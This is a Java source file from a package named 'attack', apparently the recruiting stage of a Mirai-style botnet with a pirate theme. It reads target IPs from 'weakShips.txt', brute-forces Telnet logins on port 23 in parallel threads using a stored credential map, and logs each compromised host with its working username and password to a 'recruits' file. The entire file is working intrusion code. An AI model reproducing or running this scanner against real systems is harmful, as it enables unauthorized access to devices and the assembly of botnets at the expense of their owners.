package attack;

import sniff.MonocularPeek;

import java.io.*;
import java.net.Socket;
import java.sql.Timestamp;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class RecruitScouter {

    private final List<String> foundIPs = new ArrayList<>();
    private final Map<String, String> credentialsMap;
    private final String LIST_OF_RECRUITMENTS;
    private final Set<String> pirateNameSet;
    private final int amountOfThreads; // Anzahl der Threads für die Parallelisierung

    public RecruitScouter(int amountOfThreads) {
        this.amountOfThreads = amountOfThreads;
        loadIPsFromFile();
        CredentialsProvider credentialsProvider = new CredentialsProvider();
        credentialsMap = credentialsProvider.getCredentialsMap();
        this.LIST_OF_RECRUITMENTS = MonocularPeek.getLIST_OF_RECRUITMENTS();
        pirateNameSet = credentialsMap.keySet();
        recruitPirates();
    }

    private void loadIPsFromFile() {
        String filePath = "weakShips.txt";

        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {
            String line;
            while ((line = reader.readLine()) != null) {
                String ip = extractIPAddress(line);
                if (ip != null && !ip.isEmpty()) {
                    foundIPs.add(ip);
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static String extractIPAddress(String line) {
        String ip = null;
        Pattern pattern = Pattern.compile("\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b");

        line = line.trim();

        Matcher matcher = pattern.matcher(line);
        if (matcher.find()) {
            ip = matcher.group();
        }
        return ip;
    }

    private void recruitPirates() {
        ExecutorService executorService = Executors.newFixedThreadPool(amountOfThreads);

        for (String ip : foundIPs) {
            executorService.execute(() -> {
                for (String user : pirateNameSet) {
                    String password = credentialsMap.get(user);
                    if (attemptLogin(ip, user, password)) {
                        System.out.println("Erfolgreicher Login auf " + ip + " mit " + user + ":" + password);
                    } else {
                        System.out.println("Login auf " + ip + " mit " + user + ":" + password + " fehlgeschlagen");
                    }
                }
            });
        }

        executorService.shutdown();
        while (!executorService.isTerminated()) {
            // Warten, bis alle Threads beendet sind
        }
    }

    private boolean attemptLogin(String ip, String user, String password) {
        int maxRetries = 3;
        int attempt = 0;

        while (attempt < maxRetries) {
            try {
                Socket socket = new Socket(ip, 23);
                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                out.println(user);
                out.flush();
                Thread.sleep(1000);

                out.println(password);
                out.flush();
                Thread.sleep(1000);

                StringBuilder responseBuilder = new StringBuilder();
                String responseLine;
                while ((responseLine = in.readLine()) != null) {
                    responseBuilder.append(responseLine).append("\n");
                    if (responseLine.toLowerCase().contains("login") || responseLine.toLowerCase().contains("welcome")) {
                        break;
                    }
                }
                String response = responseBuilder.toString();
                System.out.println("Response von " + ip + ": " + response);

                if (response.toLowerCase().contains("login successful") || response.toLowerCase().contains("welcome")) {
                    addRecruit(ip, response, user, password);
                    socket.close();
                    return true;
                }

                socket.close();
            } catch (IOException | InterruptedException e) {
                System.err.println("Fehler bei der Verbindung zu " + ip + ": " + e.getMessage());
            }

            attempt++;

            // Verzögerung zwischen den Versuchen einfügen, um Netzwerk- und Serverlast zu berücksichtigen
            try {
                Thread.sleep(1000); // Beispiel: 1 Sekunde warten zwischen den Versuchen
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }

        return false;
    }

    private void addRecruit(String ipAddress, String response, String user, String password) {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(LIST_OF_RECRUITMENTS, true))) {
            Timestamp timestamp = new Timestamp(System.currentTimeMillis());
            writer.write(ipAddress + " " + timestamp + System.lineSeparator() + "User: " + user + " " + "Passwort: " + password + System.lineSeparator() + " , Response: " + response + System.lineSeparator());
            writer.newLine();
            System.out.println("Rekrut gefunden und zur Datei " + LIST_OF_RECRUITMENTS + " hinzugefügt.");
        } catch (IOException e) {
            System.out.println("Fehler beim Hinzufügen zur Datei " + LIST_OF_RECRUITMENTS + ": " + e.getMessage());
        }
    }
}
